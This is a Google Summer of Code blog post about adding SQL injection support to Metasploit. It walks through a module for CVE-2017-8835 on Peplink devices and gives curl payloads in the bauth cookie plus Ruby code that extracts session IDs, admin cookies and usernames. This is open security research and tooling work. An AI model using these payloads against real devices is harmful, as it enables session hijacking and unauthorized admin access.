@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>GSoC 2020 - Enhancing metasploit support for &#39;the Hack That Will Never Go Away&#39; :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Table of Contents  Introduction My Proposal Community-Bonding period Results of my contribution Writing an exploit for CVE-2017-8835  Analysis of the vulnerability Creation of the SQL injection object a word about session management Plan for our implementation Results of the execution   Conclusion  Being interested in computer security, and being an opensource lover, I wanted to participate in Google Summer of Code this year, after checking out the list of organizations, I applied for Metasploit, because Ruby is my main programming language, and because I was very interested in contributing to a framework of this popularity."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://red0xff.github.io/posts/google_summer_of_code_2020/" />
+
+<link rel="stylesheet" href="https://red0xff.github.io/assets/reminder.css" />
+
+
+<link rel="stylesheet" href="https://red0xff.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://red0xff.github.io/assets/blue.css">
+
+
+
+<link rel="stylesheet" href="https://red0xff.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://red0xff.github.io/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="https://red0xff.github.io/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="GSoC 2020 - Enhancing metasploit support for &#39;the Hack That Will Never Go Away&#39; :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever" />
+<meta name="twitter:description" content="Table of Contents  Introduction My Proposal Community-Bonding period Results of my contribution Writing an exploit for CVE-2017-8835  Analysis of the vulnerability Creation of the SQL injection object a word about session management Plan for our implementation Results of the execution   Conclusion  Being interested in computer security, and being an opensource lover, I wanted to participate in Google Summer of Code this year, after checking out the list of organizations, I applied for Metasploit, because Ruby is my main programming language, and because I was very interested in contributing to a framework of this popularity." />
+<meta name="twitter:site" content="https://red0xff.github.io/" />
+<meta name="twitter:creator" content="NIBOUCHA Redouane" />
+<meta name="twitter:image" content="https://res.cloudinary.com/dik00g2mh/image/upload/v1598717631/gsoc_2020/lbqz6lw6yy0uytgggnov.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="GSoC 2020 - Enhancing metasploit support for &#39;the Hack That Will Never Go Away&#39; :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever">
+<meta property="og:description" content="Table of Contents  Introduction My Proposal Community-Bonding period Results of my contribution Writing an exploit for CVE-2017-8835  Analysis of the vulnerability Creation of the SQL injection object a word about session management Plan for our implementation Results of the execution   Conclusion  Being interested in computer security, and being an opensource lover, I wanted to participate in Google Summer of Code this year, after checking out the list of organizations, I applied for Metasploit, because Ruby is my main programming language, and because I was very interested in contributing to a framework of this popularity." />
+<meta property="og:url" content="https://red0xff.github.io/posts/google_summer_of_code_2020/" />
+<meta property="og:site_name" content="GSoC 2020 - Enhancing metasploit support for &#39;the Hack That Will Never Go Away&#39;" />
+<meta property="og:image" content="https://res.cloudinary.com/dik00g2mh/image/upload/v1598717631/gsoc_2020/lbqz6lw6yy0uytgggnov.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+<meta property="article:section" content="security" />
+<meta property="article:published_time" content="2019-04-24 09:27:58 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Redouane&#39;s Blog
+  </div>
+</a>
+<div id="typingcode" class="hidden"></div>
+<div id="fences"></div>
+
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/posts/">Posts</a></li>
+        
+      
+        
+          <li><a href="/search/">Search</a></li>
+        
+      
+        
+          <li><a href="/writeups/">Writeups</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about/">About</a></li>
+      
+    
+      
+        <li><a href="/posts/">Posts</a></li>
+      
+    
+      
+        <li><a href="/search/">Search</a></li>
+      
+    
+      
+        <li><a href="/writeups/">Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://red0xff.github.io/posts/google_summer_of_code_2020/">GSoC 2020 - Enhancing metasploit support for &lsquo;the Hack That Will Never Go Away&rsquo;</a></h1>
+  <div class="post-meta">
+    <span class="post-date">
+      2019-04-24
+    </span>
+    
+    <span class="post-author">::
+      NIBOUCHA Redouane
+    </span>
+    
+  </div>
+  
+  <span class="post-tags">
+    
+    #<a href="https://red0xff.github.io/tags/sql-injection/">sql injection</a>&nbsp;
+    
+    #<a href="https://red0xff.github.io/tags/web-security/">web security</a>&nbsp;
+    
+    #<a href="https://red0xff.github.io/tags/opensource/">opensource</a>&nbsp;
+    
+    #<a href="https://red0xff.github.io/tags/programming/">programming</a>&nbsp;
+    
+  </span>
+  
+
+  
+  <img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1598717631/gsoc_2020/lbqz6lw6yy0uytgggnov.png" class="post-cover" />
+  
+
+  <div class="post-content">
+    <h1 id="table-of-contents">Table of Contents</h1>
+<ol>
+<li><a href="#0b79795d3efc95b9976c7c5b933afce2">Introduction</a></li>
+<li><a href="#67ed87f44709a5e274e570dc0174bb38">My Proposal</a></li>
+<li><a href="#7aef9d0c5402a915a1f7711fd90218ed">Community-Bonding period</a></li>
+<li><a href="#fed02dc7f03d495d89a1783a42fa77d3">Results of my contribution</a></li>
+<li><a href="#981725cf5d343830f3590df23fbbf285">Writing an exploit for CVE-2017-8835</a>
+<ol>
+<li><a href="#04d84c9eded9f4fdc34c7148a3a77686">Analysis of the vulnerability</a></li>
+<li><a href="#d3af9b314b9b5c1de3c386ce802233eb">Creation of the SQL injection object</a></li>
+<li><a href="#58adb7987ef3ebb0891820242143bb4d">a word about session management</a></li>
+<li><a href="#d805c5ef0dda336d58014183916db15b">Plan for our implementation</a></li>
+<li><a href="#707ae1bbecb994d13ec98cb72f2316b7">Results of the execution</a></li>
+</ol>
+</li>
+<li><a href="#6f8b794f3246b0c1e1780bb4d4d5dc53">Conclusion</a></li>
+</ol>
+<p>Being interested in computer security, and being an opensource lover, I wanted to
+participate in Google Summer of Code this year, after checking out the list of organizations,
+I applied for Metasploit, because <code>Ruby</code> is my main programming language, and because I
+was very interested in contributing to a framework of this popularity.</p>
+<h1 id="span-id67ed87f44709a5e274e570dc0174bb38my-proposalspan"><span id='67ed87f44709a5e274e570dc0174bb38'>My Proposal</span></h1>
+<p>You can find my proposal <a href="https://summerofcode.withgoogle.com/projects/#6297726754488320">here</a>.</p>
+<h1 id="span-id7aef9d0c5402a915a1f7711fd90218edcommunity-bonding-periodspan"><span id='7aef9d0c5402a915a1f7711fd90218ed'>Community-Bonding period</span></h1>
+<p>On May 4th, I got the announcement of being accepted to take part on the program,
+during the month of May, I did my best to get familiar with the codebase, I tried fixing
+issues, understanding the structure of the libraries that had a similar usage to what I
+was willing to develop.</p>
+<p>Some issues I fixed in the Community-Bonding period:</p>
+<ul>
+<li><a href="https://github.com/rapid7/metasploit-framework/pull/13442">Fix winrm_login module</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/pull/13448">Fix following redirects from send_request_cgi!</a></li>
+</ul>
+<p>a module I also contributed during that period:</p>
+<ul>
+<li><a href="https://github.com/rapid7/metasploit-framework/pull/13534">Add the LFI module for QNAP RCE (CVE 2019-7192 - CVE 2019-7195)</a></li>
+</ul>
+<p>Thanks to <a href="https://keybase.io/h00die">h00die</a> for helping out on this module.</p>
+<h1 id="span-idfed02dc7f03d495d89a1783a42fa77d3results-of-my-contributionspan"><span id='fed02dc7f03d495d89a1783a42fa77d3'>Results of my contribution</span></h1>
+<p>After working three months on implementing the project on my proposal, here are the Pull-Requests I sent during the GSoC period:</p>
+<ol>
+<li>Merged</li>
+</ol>
+<ul>
+<li><a href="https://github.com/rapid7/metasploit-framework/pull/13596">Support for MySQL/MariaDB injection, and rewrite of some module</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/pull/13913">Specs/Unit tests for the library</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/pull/13847">Support for SQLite injection, and module for a peplink balance vulnerability (CVE-2017-8835)</a></li>
+<li>Also was able to discover and fix <a href="https://github.com/rapid7/metasploit-framework/pull/13900">a bug on cookie parsing</a>, while testing my library</li>
+</ul>
+<ol start="2">
+<li>Not merged yet:</li>
+</ol>
+<ul>
+<li><a href="https://github.com/rapid7/metasploit-framework/pull/14067">Support for PostgreSQL, and module for CVE-2019-13375</a></li>
+</ul>
+<ol start="3">
+<li>PR not sent yet</li>
+</ol>
+<ul>
+<li><a href="https://github.com/red0xff/metasploit-framework/tree/GSOC/MSSQLi_Support">Support for Microsoft SQL Server</a></li>
+<li><a href="https://github.com/red0xff/metasploit-framework/tree/GSOC/Oracle-DB-SQLi-Support">Support for Oracle Database</a></li>
+</ul>
+<ol start="4">
+<li>To-do work</li>
+</ol>
+<ul>
+<li>Specs for the other implementations, should be using the shared examples, because of the similar structure between DBMS-specific classes.</li>
+<li>Perhaps modules exploiting Oracle Database/MSSQL injection vulnerabilities, and using the library (only testing modules have been provided).</li>
+</ul>
+<p>Summary of the work done:</p>
+<table>
+<thead>
+<tr>
+<th align="center">DBMS</th>
+<th align="center">Regular SQLi</th>
+<th align="center">Time Blind</th>
+<th align="center">Boolean blind</th>
+<th align="center">Reading files</th>
+<th align="center">Writing to files</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">MySQL/MariaDB</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">Yes (<code>load_file</code>)</td>
+<td align="center">Yes (select .. into dumpfile)</td>
+</tr>
+<tr>
+<td align="center">SQLite</td>
+<td align="center">Yes</td>
+<td align="center">Yes (heavy queries)</td>
+<td align="center">Yes</td>
+<td align="center">No</td>
+<td align="center">Yes (attach database ..)</td>
+</tr>
+<tr>
+<td align="center">PostgreSQL</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">No</td>
+<td align="center">Yes (copy &hellip; to &hellip;)</td>
+</tr>
+<tr>
+<td align="center">Microsoft SQL Server</td>
+<td align="center">Yes</td>
+<td align="center">Yes (stacked queries)</td>
+<td align="center">Yes</td>
+<td align="center">No</td>
+<td align="center">No</td>
+</tr>
+<tr>
+<td align="center">Oracle Database</td>
+<td align="center">Yes, one row at a time</td>
+<td align="center">Yes (<code>dbms_pipe</code> package)</td>
+<td align="center">Yes</td>
+<td align="center">No</td>
+<td align="center">No</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Methods for enumerating databases, table names, column names, users also were provided for each DBMS.</li>
+</ul>
+<h1 id="span-id981725cf5d343830f3590df23fbbf285writing-an-exploit-for-cve-2017-8835span"><span id='981725cf5d343830f3590df23fbbf285'>Writing an exploit for CVE-2017-8835</span></h1>
+<p>While browsing recent SQL injection CVEs, I came across <a href="https://www.cvedetails.com/cve/CVE-2017-8835/">CVE-2017-8835</a>, after searching a bit,
+<a href="https://www.exploit-db.com/exploits/42130">I found it on exploit-db</a>, seeing that the DBMS in-use is SQLite, this looked like a great candidate for testing
+SQLite injection support.</p>
+<p>Luckily, I was able to reproduce the vulnerability on <a href="https://www.peplink.com/products/fusionhub/">FusionHub</a>, by flashing a vulnerable firmware version,
+also, because the SQL injection (as reported in the Exploit-DB link) is boolean-based blind, and they are using it just to bypass authentication, so I thought about
+enumerating more.</p>
+<p>The final version of the module can be found <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/peplink_bauth_sqli.rb">here</a>, this
+is a step-by-step guide as of where I was able to save time writing it.</p>
+<h2 id="span-id04d84c9eded9f4fdc34c7148a3a77686analysis-of-the-vulnerabilityspan"><span id='04d84c9eded9f4fdc34c7148a3a77686'>Analysis of the vulnerability</span></h2>
+<p>When looking at the vulnerability, we notice that the injection happens on a SELECT statement, the injection point is like : <code>SELECT id from sessions where sessionid='&lt;INJECTION POINT&gt;';</code>,
+and it&rsquo;s just bypassing authentication (an admin must be authenticated for it to work), so, I quickly got FusionHub running with the vulnerable firmware, and started testing.</p>
+<p>Visiting <code>/cgi-bin/MANGA/admin.cgi</code> with the bauth cookie issued by the webserver:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --cookie <span style="color:#0ff;font-weight:bold">&#34;bauth=&#39; or 1=1--&#34;</span> http://192.168.1.254/cgi-bin/MANGA/admin.cgi -vv
+</code></pre></div><p><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1598710714/gsoc_2020/abb86y9pya2nv7xmemhh.png" alt="sqli_true"></p>
+<p>Now, visiting the same URL with an invalid cookie value (select statement should return 0 rows)</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --cookie <span style="color:#0ff;font-weight:bold">&#34;bauth=&#39; and 1=2--&#34;</span> http://192.168.1.254/cgi-bin/MANGA/admin.cgi -vv
+</code></pre></div><p><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1598710728/gsoc_2020/ldh97tzuxweyjldyuuyd.png" alt="sqli_false"></p>
+<p>It&rsquo;s obvious that the taken result from the select in the first case is the session of a user who is not logged-in, and in the second case, it worked as if the session cookie wasn&rsquo;t set
+(as you see, a <code>Set-Cookie</code> header was returned).</p>
+<p>This additional <code>Set-Cookie</code> header should be enough to distinguish between true and false expressions, and to retrieve all the data from the database, we have a place for a condition to evaluate,</p>
+<p>and we can see the result of its evaluation.</p>
+<h2 id="span-idd3af9b314b9b5c1de3c386ce802233ebcreation-of-the-sql-injection-objectspan"><span id='d3af9b314b9b5c1de3c386ce802233eb'>Creation of the SQL injection object</span></h2>
+<p>The code for creating the SQLi object is:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">@sqli = create_sqli(<span style="color:#0ff;font-weight:bold">dbms</span>: SQLitei::BooleanBasedBlind) <span style="color:#fff;font-weight:bold">do</span> |payload|
+  res = send_request_cgi({
+    <span style="color:#0ff;font-weight:bold">&#39;uri&#39;</span> =&gt; normalize_uri(target_uri.path, <span style="color:#0ff;font-weight:bold">&#39;cgi-bin&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;MANGA&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;admin.cgi&#39;</span>),
+    <span style="color:#0ff;font-weight:bold">&#39;method&#39;</span> =&gt; <span style="color:#0ff;font-weight:bold">&#39;GET&#39;</span>,
+    <span style="color:#0ff;font-weight:bold">&#39;cookie&#39;</span> =&gt; <span style="color:#0ff;font-weight:bold">&#34;bauth=&#39; or </span><span style="color:#0ff;font-weight:bold">#{</span>payload<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">--&#34;</span>
+  })
+  fail_with <span style="color:#0ff;font-weight:bold">&#39;Unable to connect to target&#39;</span> <span style="color:#fff;font-weight:bold">unless</span> res
+  res.get_cookies.empty? <span style="color:#007f7f"># no Set-Cookie header means the session cookie is valid</span>
+<span style="color:#fff;font-weight:bold">end</span>
+</code></pre></div><p>The code is very straightforward.</p>
+<ul>
+<li>The dbms argument is the class that should handle this injection, we know it&rsquo;s <code>SQLite</code> and it&rsquo;s boolean-based blind.</li>
+<li>Because it&rsquo;s boolean-based blind, the payload that our block will receive will always be a condition, we just have to query it.</li>
+<li>Our block should return a boolean, if the condition is true, the server should not yield a <code>Set-Cookie</code> header because it would return an existing session, our block should return true.</li>
+<li>If the condition is false, the server should yield a <code>Set-Cookie</code> header, so our block should return false.</li>
+</ul>
+<p>Having the object created, it is no longer a blind SQL injection for the module writer, the method <code>run_sql</code> takes an SQL query, and takes care of converting it to a serie of conditions that will be passed to the block.
+(Without the SQL Injection library, module writers would need to do the binary search involved with blind SQL injection)
+First, let&rsquo;s check that the target is really vulnerable:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#fff;font-weight:bold">if</span> @sqli.test_vulnerable
+  Exploit::CheckCode::Vulnerable
+<span style="color:#fff;font-weight:bold">else</span>
+  Exploit::CheckCode::Safe
+<span style="color:#fff;font-weight:bold">end</span>
+</code></pre></div><p>The <code>test_vulnerable</code> method just checks if yielding <code>1=1</code> to the block returns <code>true</code>, and <code>1=2</code> returns <code>false</code>.</p>
+<h2 id="span-id58adb7987ef3ebb0891820242143bb4da-word-about-session-managementspan"><span id='58adb7987ef3ebb0891820242143bb4d'>a word about session management</span></h2>
+<p>For managing sessions, two tables are created using the following queries</p>
+<pre><code>CREATE TABLE IF NOT EXISTS sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, sessionid TEXT NOT NULL, tstamp TIMESTAMP NOT NULL, UNIQUE(sessionid))
+CREATE TABLE IF NOT EXISTS sessionsvariables (id INTEGER REFERENCES sessions(id) ON DELETE CASCADE, name TEXT NOT NULL, value TEXT NOT NULL, PRIMARY KEY (id, name))
+</code></pre><ul>
+<li><code>sessions</code> holds the actual cookie, in the <code>sessionid</code> field.</li>
+<li>for authenticated users, <code>sessionsvariables</code> contains many rows per session, one has <code>name=expire</code> and <code>value</code> being an expiration time, one having <code>name=username</code> and value being the username, and so on.</li>
+</ul>
+<h2 id="span-idd805c5ef0dda336d58014183916db15bplan-for-our-implementationspan"><span id='d805c5ef0dda336d58014183916db15b'>Plan for our implementation</span></h2>
+<p>Let&rsquo;s count the number of existing authenticated sessions, by counting the number of expiration times that exist in the database:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">session_count = @sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select count(1) from sessionsvariables where name=&#39;expire&#39;&#34;</span>).to_i
+</code></pre></div><p>So, the plan is:</p>
+<ul>
+<li>Retrieve the <code>id</code>s of the sessions, sorted by expiration time (newest first).</li>
+<li>Filter them (if the user chose to only test admin/privileged sessions).</li>
+<li>Start retrieving the session cookies associated with each <code>id</code>.</li>
+</ul>
+<p>Let&rsquo;s start by retrieving the <code>id</code>s of the sessions, sorted by expiration time.</p>
+<p>Simplified code:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">digit_range = (<span style="color:#0ff;font-weight:bold">&#39;0&#39;</span>..<span style="color:#0ff;font-weight:bold">&#39;9&#39;</span>)
+session_ids = session_count.times.map <span style="color:#fff;font-weight:bold">do</span> |i|
+  <span style="color:#fff;font-weight:bold">id</span> = @sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select id from sessionsvariables where name=&#39;expire&#39; &#34;</span> \
+  <span style="color:#0ff;font-weight:bold">&#34;order by cast(value as int) desc limit 1 offset </span><span style="color:#0ff;font-weight:bold">#{</span>i<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">output_charset</span>: digit_range)
+  <span style="color:#007f7f"># other code here, checking if the user is an admin if only admins should be returned</span>
+  <span style="color:#fff;font-weight:bold">id</span>
+<span style="color:#fff;font-weight:bold">end</span>
+</code></pre></div><p>The <code>digit_range</code> passed to <code>run_sql</code> is used to speed-up the process, since we know <code>id</code>s are integers, there are bits we already know, we don&rsquo;t need to leak 8 bits from each byte, by specifying the range of characters,
+the injection will only leak bits that change between bytes in that range.</p>
+<p>I will skip filtering for admins, you will find it in the final module, it can be done by checking if there is an entry having <code>name=rwa</code> and <code>value=1</code>, which means full access.</p>
+<p>Now, retrieving actual cookies:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">alphanumeric_range = (<span style="color:#0ff;font-weight:bold">&#39;0&#39;</span>..<span style="color:#0ff;font-weight:bold">&#39;z&#39;</span>)
+cookies = [ ]
+session_ids.each_with_index <span style="color:#fff;font-weight:bold">do</span> |<span style="color:#fff;font-weight:bold">id</span>, idx|
+  cookie = @sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select sessionid from sessions where id=</span><span style="color:#0ff;font-weight:bold">#{</span><span style="color:#fff;font-weight:bold">id</span><span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">output_charset</span>: alphanumeric_range)
+  cookies &lt;&lt; cookie
+  <span style="color:#fff;font-weight:bold">if</span> datastore[<span style="color:#0ff;font-weight:bold">&#39;EnumUsernames&#39;</span>]
+    username = @sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select value from sessionsvariables where name=&#39;username&#39; and id=</span><span style="color:#0ff;font-weight:bold">#{</span><span style="color:#fff;font-weight:bold">id</span><span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+  <span style="color:#fff;font-weight:bold">end</span>
+  <span style="color:#007f7f"># more code that is irrelevant to this post</span>
+<span style="color:#fff;font-weight:bold">end</span>
+</code></pre></div><h2 id="span-id707ae1bbecb994d13ec98cb72f2316b7results-of-the-executionspan"><span id='707ae1bbecb994d13ec98cb72f2316b7'>Results of the execution</span></h2>
+<p><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1598711216/gsoc_2020/wlzmh7voeuco9hkoqt7r.png" alt="retrieval of cookies"></p>
+<p>(The error, <code>Login is required ...</code> just indicates that <code>x4J...2Ps</code> is not an admin cookie, it&rsquo;s the cookie of an unprivileged user).</p>
+<p>Not only we reproduced the vulnerability, but we were able to retrieve the actual cookies with minimal effort using the library.</p>
+<p>a note about this module: using methods like <code>enum_table_names</code>, <code>enum_table_columns</code>, <code>dump_table_fields</code> might not work because the size of the string embedded in SQL queries is limited (the vulnerable code is written in C,
+and fixed-size buffers are used), and these methods generate long queries to deal with <code>NULL</code> values, convert (cast) types, encode and so on, for cases like this, we can always fall back to <code>run_sql</code>, which should work in most cases.</p>
+<h1 id="span-id6f8b794f3246b0c1e1780bb4d4d5dc53conclusionspan"><span id='6f8b794f3246b0c1e1780bb4d4d5dc53'>Conclusion</span></h1>
+<p>Working with rapid7 members on the Metasploit Framework was really a great experience for me, I learned a lot of things, would like to thank my mentor, Jeffrey Martin (<code>Op3n4M3</code>), as well as other contributors who helped me out,
+<code>h00die</code>, <code>zeroSteiner</code> and <code>dwelch-r7</code> to name a few.</p>
+<p>I will keep contributing to the project, hopefully getting all of the library merged, and getting some other issues I had noticed in the codebase fixed.</p>
+
+  </div>
+  
+  <div class="pagination">
+    <div class="pagination__title">
+      <span
+        class="pagination__title-h">Read other posts</span>
+      <hr />
+    </div>
+    <div class="pagination__buttons">
+      
+      
+      <span class="button next">
+        <a href="https://red0xff.github.io/posts/when_exploit_mitigations_are_disabled_on_modern_systems/">
+          <span class="button__text">When exploit mitigations are disabled on modern systems</span>
+          <span class="button__icon">→</span>
+        </a>
+      </span>
+      
+    </div>
+  </div>
+  
+
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "red0xff" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>:: Proudly hosted on Github</span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://red0xff.github.io/assets/main.js"></script>
+<script src="https://red0xff.github.io/assets/prism.js"></script>
+<script src="https://red0xff.github.io/assets/reminder.js"></script>
+<script src="https://red0xff.github.io/assets/codetyper.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
